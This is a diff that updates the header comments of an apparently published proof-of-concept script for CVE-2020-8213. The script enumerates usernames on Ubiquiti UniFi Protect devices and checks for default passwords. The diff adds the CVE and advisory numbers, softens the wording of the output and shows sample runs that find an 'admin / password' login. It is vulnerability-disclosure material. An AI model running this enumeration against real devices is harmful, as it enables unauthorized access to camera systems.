@@ -4,21 +4,21 @@
 # Vendor Homepage: http://www.ui.com/
 # Software Link: https://www.ui.com/download/unifi/unifi-cloud-key-gen2
 # Version: CloudKey Firmware 1.1.13 and below / UniFi Protect 1.13.3 and below
-# Tested on: Ubiquiti UniFi CloudKey Gen2 Plus Firmware 1.1.13 / UniFi Protect 1.13.3 
-# CVE : CVE-2020-XXXX
-# Advisory: https://www.tenable.com/security/research/tra-2020-XX
+# Tested on: Ubiquiti UniFi CloudKey Gen2 Plus Firmware 1.1.13 / UniFi Protect 1.13.3
+# CVE : CVE-2020-8213
+# Advisory: https://www.tenable.com/security/research/tra-2020-45
 # Sample output:
 #
-# $python3 cve_2020_xxxx_test_unifi_protect_usernames.py -t 192.168.30.6 admin root nvr-admin ubnt user newuser -d
+# $python3 cve_2020_8213_test_unifi_protect_usernames.py -t 192.168.30.6 admin root nvr-admin ubnt user newuser -d
 # [+] Getting connection to host 192.168.30.6, port 7443
 # [+] Trying username: admin
 # [!] Found valid username / password: admin / password
 # [+] Trying username: root
 # [+] Trying username: nvr-admin
-# [!] Found valid username: nvr-admin
+# [!] Found potentially valid username: nvr-admin
 # [+] Trying username: ubnt
 # [+] Trying username: user
-# [!] Found valid username: user
+# [!] Found potentially valid username: user
 # [+] Trying username: newuser
 #
 # Valid usernames:
@@ -29,15 +29,15 @@
 # Valid passwords (username / password):
 # admin / password
 #
-# $python3 cve_2020_xxxx_test_unifi_protect_usernames.py -t 192.168.30.6 -f usernames.txt -d
+# $python3 cve_2020_8213_test_unifi_protect_usernames.py -t 192.168.30.6 -f usernames.txt -d
 # [+] Getting connection to host 192.168.30.6, port 7443
 # [+] Trying username: admin
 # [!] Found valid username / password: admin / password
 # [+] Trying username: owner
 # [+] Trying username: nvr-admin
-# [!] Found valid username: nvr-admin
+# [!] Found potentially valid username: nvr-admin
 # [+] Trying username: user
-# [!] Found valid username: user
+# [!] Found potentially valid username: user
 # [+] Trying username: ubnt
 #
 # Valid usernames:
@@ -221,7 +221,7 @@ def main():
     if not len(valid_usernames):
         print("No valid usernames found")
         exit(0)
-    
+
     if valid_usernames == usernames:
         print("\nAll failed authentication HTTP response codes were 401, either UniFi Protect is patched or all usernames in list are valid")
     else:
